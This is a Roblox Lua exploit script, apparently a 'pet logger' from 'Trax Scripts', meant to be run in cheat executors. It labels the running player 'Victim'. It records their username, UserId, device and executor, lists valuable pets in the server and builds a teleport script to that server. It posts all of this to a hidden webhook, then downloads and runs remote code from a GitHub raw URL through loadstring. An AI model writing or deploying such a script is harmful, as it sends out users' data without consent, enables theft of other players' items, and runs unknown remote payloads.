local Webhook = __WEBHOOK__  

local workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local request = http_request or request or syn and syn.request or http and http.request or fluxus and fluxus.request
local LocalPlayer = Players.LocalPlayer

local function identifyexecutor()
    if _G.DeltriousExecutor or _G.DeltaExecutor or _G.DeltaSynapse or _G.Delta or _G.Deltrious or _G.DeltriousHook then
        return "Delta"
    elseif syn and syn.request then
        return "Synapse"
    elseif fluxus and fluxus.request then
        return "Fluxus"
    elseif KRNL_LOADED or Krnl or Krnl_Executor then
        return "Krnl"
    elseif identifyexecutor or _G.IdentifyExecutor then
        return "Unknown Exploit"
    else
        return "Unknown"
    end
end

local device = UserInputService.TouchEnabled and "Mobile" or "PC"
local executor = identifyexecutor()

local allowedPetNames = {
    ["cocofantoelefanto"] = true,
    ["girafacelestre"] = true,
    ["gattatinonyanino"] = true,
    ["matteo"] = true,
    ["tralalerotralala"] = true,
    ["tigroligrefrutonni"] = true,
    ["odindindindun"] = true,
    ["orcaleroorcala"] = true,
    ["trenozosturzzoturbo3000"] = true,
    ["ballerinolololo"] = true,
    ["lavaccasaturnosaturnita"] = true,
    ["torrtuginnidragonfrutini"] = true,
    ["lostralaleritos"] = true,
    ["lastralaleritas"] = true,
    ["graipussmedussi"] = true,
    ["pothotspot"] = true,
    ["lagrandecombinassion"] = true,
    ["nuclearodinosauro"] = true,
    ["garamaandmadundung"] = true,
}

local skipExactNames = {
    ["shopnpccandy"] = true,
    ["shopnpccash"] = true,
    ["bubblegummachine"] = true,
}

local function normalizeName(name)
    return name:lower():gsub("%s+", ""):gsub("–", ""):gsub("[^%w]", "")
end

local placeId = game.PlaceId
local jobId = game.JobId
local teleportScript = ('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")'):format(placeId, jobId)

local petCounts = {}
for _, model in pairs(workspace:GetChildren()) do
    if model:IsA("Model") then
        local norm = normalizeName(model.Name)
        if not skipExactNames[norm] and allowedPetNames[norm] then
            petCounts[model.Name] = (petCounts[model.Name] or 0) + 1
        end
    end
end

local content = ""
local fields = {
    {
        name = "👤 Victim",
        value = LocalPlayer.Name
    },
    {
        name = "🆔 UserId",
        value = tostring(LocalPlayer.UserId)
    },
    {
        name = "💻 Device",
        value = device
    },
    {
        name = "⚙️ Executor",
        value = executor
    },
    {
        name = "⏰ Timestamp",
        value = os.date("%Y-%m-%d %H:%M:%S")
    }
}

if next(petCounts) then
    content = "💎 **Valuable Pets Found!**"

    local petLines = {}
    for name, count in pairs(petCounts) do
        local fakeStuds = math.random(250, 500) + math.random()
        table.insert(petLines, string.format("- %s x%d (%.1f studs)", name, count, fakeStuds))
    end

    table.insert(fields, {
        name = "🐾 Pets Found",
        value = table.concat(petLines, "\n")
    })
else
    content = "❌ No valuable pets found."
end

table.insert(fields, {
    name = "📜 Join Script",
    value = "**Copy and paste this in your executor:**\n> ``" .. teleportScript .. "``"
})

pcall(function()
    if request then
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = content,
                embeds = {{
                    title = "🎯 Pet Logger",
                    color = next(petCounts) and 65280 or 16711680,
                    fields = fields,
                    footer = {
                        text = "Trax Scripts · " .. os.date("%H:%M:%S")
                    }
                }}
            })
        })
    end
end)

local success, err = pcall(function()
    local remoteScript = game:HttpGet('https://raw.githubusercontent.com/7SFailure/Main/refs/heads/main/Beta')
    loadstring(remoteScript)()
end)
